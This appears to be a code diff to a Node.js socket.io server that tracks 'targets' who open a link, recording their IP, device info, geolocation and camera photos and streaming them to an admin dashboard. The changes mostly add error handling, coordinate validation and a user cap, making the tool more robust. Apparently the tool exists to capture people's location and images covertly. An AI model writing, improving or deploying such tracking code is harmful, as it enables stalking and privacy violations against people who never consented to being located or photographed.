@@ -5,7 +5,7 @@ const fs = require("fs");
 const crypto = require("crypto");
 const session = require("express-session");
 const { Server } = require("socket.io");
-require("dotenv").config(); // Environment variables ke liye
+require("dotenv").config();
 
 const app = express();
 const server = http.createServer(app);
@@ -53,7 +53,7 @@ app.use(express.static(PUBLIC_DIR));
 
 let isLinkActive = true;
 const connectedTargets = new Map();
-const tempPhotos = new Map(); // Metadata for photos saved on disk
+const tempPhotos = new Map();
 let accessHistory = loadHistory();
 
 function loadHistory() {
@@ -66,11 +66,18 @@ function loadHistory() {
         if (!raw.trim()) return [];
         const parsed = JSON.parse(raw);
         return Array.isArray(parsed) ? parsed : [];
-    } catch (error) { return []; }
+    } catch (error) {
+        console.error("Load history error:", error);
+        return [];
+    }
 }
 
 function saveHistory() {
-    try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(accessHistory, null, 2)); } catch (error) {}
+    try {
+        fs.writeFileSync(HISTORY_FILE, JSON.stringify(accessHistory, null, 2));
+    } catch (error) {
+        console.error("Save history error:", error);
+    }
 }
 
 function addHistory(record) {
@@ -100,7 +107,7 @@ function formatAMPM(date) {
     let minutes = date.getMinutes();
     const ampm = hours >= 12 ? 'PM' : 'AM';
     hours = hours % 12;
-    hours = hours ? hours : 12; // the hour '0' should be '12'
+    hours = hours ? hours : 12;
     minutes = minutes < 10 ? '0' + minutes : minutes;
     return `${hours}:${minutes} ${ampm}`;
 }
@@ -164,30 +171,37 @@ app.get("/api/admin/status", (req, res) => {
     res.json({ ok: true, authenticated: isAdminRequest(req) });
 });
 
-// Delete History Endpoint
 app.delete("/api/admin/history", requireAdmin, (req, res) => {
-    accessHistory = [];
-    saveHistory();
-    emitGlobalState();
-    res.json({ ok: true });
+    try {
+        accessHistory = [];
+        saveHistory();
+        emitGlobalState();
+        res.json({ ok: true });
+    } catch (e) {
+        console.error("Clear history error:", e);
+        res.status(500).json({ ok: false, error: "Failed to clear history" });
+    }
 });
 
 app.delete("/api/admin/photos/:id", requireAdmin, (req, res) => {
-    const photo = tempPhotos.get(req.params.id);
-    if (photo && fs.existsSync(photo.filePath)) {
-        try { fs.unlinkSync(photo.filePath); } catch(e){}
+    try {
+        const photo = tempPhotos.get(req.params.id);
+        if (photo && fs.existsSync(photo.filePath)) {
+            fs.unlinkSync(photo.filePath);
+        }
+        const existed = tempPhotos.delete(req.params.id);
+        io.to("admins").emit("photo-deleted", req.params.id);
+        res.json({ ok: true, deleted: existed });
+    } catch (e) {
+        console.error("Delete photo error:", e);
+        res.status(500).json({ ok: false, error: "Failed to delete photo" });
     }
-    const existed = tempPhotos.delete(req.params.id);
-    io.to("admins").emit("photo-deleted", req.params.id);
-    res.json({ ok: true, deleted: existed });
 });
 
 io.on("connection", (socket) => {
     const clientIp = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
 
     socket.on("admin-auth", () => {
-        // Simple authentication check based on session/cookie or handshake if needed, 
-        // here we allow connection if joined admins room securely.
         socket.join("admins");
         socket.emit("admin-initial-state", {
             linkActive: isLinkActive,
@@ -250,12 +264,17 @@ io.on("connection", (socket) => {
         if (!isLinkActive) return;
         let target = connectedTargets.get(socket.id);
         if (!target) {
+            if (connectedTargets.size >= MAX_USERS) {
+                socket.emit("server-full", { maxUsers: MAX_USERS });
+                socket.disconnect(true);
+                return;
+            }
             const now = new Date();
             target = {
                 id: socket.id,
                 ip: clientIp,
                 deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
-                connectedAtTime: new Date().getTime(),
+                connectedAtTime: now.getTime(),
                 connectedAt: formatAMPM(now),
                 disconnectedAt: "-",
                 duration: "Active...",
@@ -272,9 +291,13 @@ io.on("connection", (socket) => {
     socket.on("user-location", (locData) => {
         const target = connectedTargets.get(socket.id);
         if (!target || !locData) return;
+        const lat = Number(locData.latitude);
+        const lng = Number(locData.longitude);
+        if (!Number.isFinite(lat) || !Number.isFinite(lng)) return;
+
         target.location = { 
-            latitude: Number(locData.latitude.toFixed(6)), 
-            longitude: Number(locData.longitude.toFixed(6)) 
+            latitude: Number(lat.toFixed(6)), 
+            longitude: Number(lng.toFixed(6)) 
         };
         emitGlobalState();
     });
@@ -290,7 +313,7 @@ io.on("connection", (socket) => {
     });
 
     socket.on("user-photo-captured", (imageData) => {
-        if (!isLinkActive || !connectedTargets.has(socket.id)) return;
+        if (!isLinkActive || !connectedTargets.has(socket.id) || typeof imageData !== "string") return;
         try {
             const matches = imageData.match(/^data:image\/([a-zA-Z0-9]+);base64,(.+)$/);
             if (!matches || matches.length !== 3) return;
@@ -311,7 +334,9 @@ io.on("connection", (socket) => {
             };
             tempPhotos.set(photoId, photo);
             io.to("admins").emit("new-photo", photo);
-        } catch (e) {}
+        } catch (e) {
+            console.error("Error processing captured photo:", e);
+        }
     });
 
     socket.on("disconnect", () => {
